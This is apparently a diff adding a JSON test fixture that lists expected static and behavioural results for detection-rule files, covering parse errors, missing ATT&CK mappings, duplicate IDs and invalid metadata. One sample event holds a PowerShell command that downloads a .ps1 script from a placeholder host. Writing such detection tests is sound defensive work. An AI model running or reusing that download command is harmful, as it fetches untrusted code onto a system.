@@ -1,0 +1,43 @@
+{
+  "07_malformed_yaml.yml": {
+    "expected_static_result": "FAIL",
+    "expected_findings": [
+      "yaml_parse_error"
+    ]
+  },
+
+  "08_missing_attack_mapping.yml": {
+    "expected_static_result": "FAIL",
+    "expected_findings": [
+      "missing_attack_mapping"
+    ]
+  },
+
+  "09_duplicate_rule_id.yml": {
+    "expected_static_result": "FAIL",
+    "expected_findings": [
+      "duplicate_rule_id"
+    ]
+  },
+
+  "10_invalid_metadata.yml": {
+    "expected_static_result": "FAIL",
+    "expected_findings": [
+      "invalid_status",
+      "invalid_level"
+    ]
+  },
+
+  "11_behavioral_test_failure.yml": {
+    "expected_static_result": "PASS",
+    "expected_findings": [],
+    "behavioral_test": {
+      "event": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe Invoke-WebRequest https://example.invalid/update.ps1"
+      },
+      "expected_match": true,
+      "expected_actual_match": false
+    }
+  }
+}
